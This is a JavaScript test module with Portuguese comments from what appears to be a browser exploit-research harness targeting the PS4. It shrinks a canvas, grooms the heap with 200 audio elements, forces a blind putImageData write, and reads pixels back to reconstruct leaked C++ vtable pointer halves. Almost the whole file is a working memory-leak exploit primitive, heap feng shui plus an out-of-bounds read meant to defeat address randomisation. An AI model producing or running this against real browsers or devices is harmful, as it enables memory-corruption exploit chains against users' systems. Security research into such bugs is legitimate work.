import { Groomer } from '../mod_groomer.js';

export default {
    id:       'CANVAS_IMAGEDATA_OOB',
    category: 'Graphics',
    risk:     'CRITICAL',
    description:
        'OOB Read na memória gráfica. O Canvas é encolhido síncronamente, mas a pintura ' +
        'dos dados massivos prossegue. O Heap Feng Shui posiciona objetos HTML pesados ' +
        '(elementos <audio>) adjacentes ao buffer libertado para extração de ponteiros C++ (vTables).',

    setup: function() {
        this.results = {};
        this.sandbox = document.getElementById('groomer-sandbox');

        this.canvas = document.createElement('canvas');
        this.canvas.width = 50;
        this.canvas.height = 50;
        this.sandbox.appendChild(this.canvas);

        this.ctx = this.canvas.getContext('2d', { willReadFrequently: true });

        // FIX: fill(0) em vez de fill(0x41).
        // Agora qualquer byte ≠ 0 nos pixels lidos é candidato a leak genuíno —
        // elimina falsos positivos causados por premultiplied alpha / color-space conversion.
        this.toxicData = this.ctx.createImageData(50, 50);
        this.toxicData.data.fill(0);
    },

    trigger: function() {
        try {
            // 1. GATILHO: Destrói o backing store do C++
            this.canvas.width = 1;

            // 2. HEAP FENG SHUI: Plantando alvos ricos em ponteiros vTable
            this.pointerTargets = [];
            for (let i = 0; i < 200; i++) {
                let el = document.createElement('audio');
                this.sandbox.appendChild(el);
                this.pointerTargets.push(el);
            }

            // 3. Força escrita cega sobre a memória libertada
            this.ctx.putImageData(this.toxicData, 0, 0);

            // 4. Lê 4 pixels (16 bytes = 2 ponteiros de 64-bits potenciais)
            this.results.leaked = this.ctx.getImageData(0, 0, 4, 1);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: Estado geral da operação
        s => s.results.error || 'Pintura Gráfica Aceite',

        // Probe 1: Extrator de endereços (reconstrução numérica de 32-bits)
        // FIX: check agora é apenas `r !== 0` (fill era 0, qualquer coisa diferente é suspeita).
        // FIX: return 'Protegido' no else — elimina o `undefined` implícito anterior.
        s => {
            if (s.results.leaked) {
                let data = s.results.leaked.data;
                let r = data[0], g = data[1], b = data[2], a = data[3];

                if (r !== 0 || g !== 0 || b !== 0 || a !== 0) {
                    // Reconstrói metade de um ponteiro nativo (little-endian, 32-bits low half)
                    let rawValue  = (a << 24) | (b << 16) | (g << 8) | r;
                    let unsignedVal = rawValue >>> 0;

                    // Heurística de ponteiro PS4: espaço de utilizador FreeBSD AMD64
                    // tipicamente em 0x00007F__________ — low 32-bits raramente são zero
                    return `💥 LEAK C++ [Metade de Ponteiro]: 0x${unsignedVal.toString(16).toUpperCase()} (RGBA bruto: ${r},${g},${b},${a})`;
                }

                // FIX: retorno explícito quando todos os bytes são zero
                return 'Protegido / Buffer Nulo';
            }

            // FIX: retorno explícito quando getImageData falhou
            return 'Sem dados lidos';
        }
    ],

    cleanup: function() {
        try { this.canvas.remove(); } catch(e){}
        if (this.pointerTargets) {
            this.pointerTargets.forEach(el => { try { el.remove(); } catch(e){} });
        }
        this.pointerTargets = null;
        this.canvas         = null;
        this.ctx            = null;
        this.toxicData      = null;
        this.results        = {};
    }
};

